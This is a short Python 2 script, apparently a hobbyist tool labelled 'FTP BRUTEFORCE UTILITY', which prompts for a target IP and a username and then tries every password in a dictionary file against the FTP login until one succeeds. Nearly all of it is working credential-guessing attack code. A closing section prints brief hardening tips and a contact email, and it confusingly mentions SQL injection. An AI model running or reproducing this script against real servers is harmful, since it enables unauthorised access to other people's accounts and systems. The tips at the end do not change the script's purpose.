from ftplib import FTP
import os
import time


print "\n\t\t#################################################"
print "\t\t#                                               #"
print "\t\t#             FTP BRUTEFORCE UTILITY            #"
print "\t\t#                  BY WARLOCK                   #"
print "\t\t#                                               #"
print "\t\t#################################################"
print"\n[+]PLEASE ENTER TARGET IP-ADRESS E.g. 192.168.0.1"
h=raw_input("\n[+]PLEASE ENTER HOST : ")
ftp = FTP(h)


i=raw_input("\n[+]PLEASE ENTER USERNAME :")
fobj = open('../../../dictonary.txt','r')
	


for pas in fobj:
    p= pas.rstrip()
    print"[+]TRYING :",i,p
    try:
        if ftp.login(i,p):
            print "\n\n\n[+]PASSWORD FOUND : ",p,"\n\n\n"
            break
    except:
        time.sleep(3)



fobj.close()
print"\n[+]YOU FOUND YOUR WEBSITE IN SQL INJECTION VULNRABLE???"
o=raw_input("y or n : ")

if o=='y':
  print"\n[+]DID I CRACK THE PASSWORD OF YOUR FTP ???"
  v=raw_input("y or n : ")
  if v=='y':
    print"\n[+]STEP 1.  TRY TO KEEP A STRONG PASSWORD"
    print"\n[+]STEP 2.  UPDATE THE FTP SERVER"
    print"\n[+]STEP 3.  TRY TO MAKE FTP ACCESSABLE BY STATIC OR PERSONAL IP"
    print"\n[+}STEP 4.  IF YOU ARE COMPLETLY UNKNOWN TO THIS STUFF...PLEASE EMAIL ME AT nisargjani20996@gmail.com OR CONSULT TO PENTESTERS / IT CONSULTERS"
  else:
    pass
else:
  pass
raw_input("\n[+]PRESS ANY KEY TO EXIT")
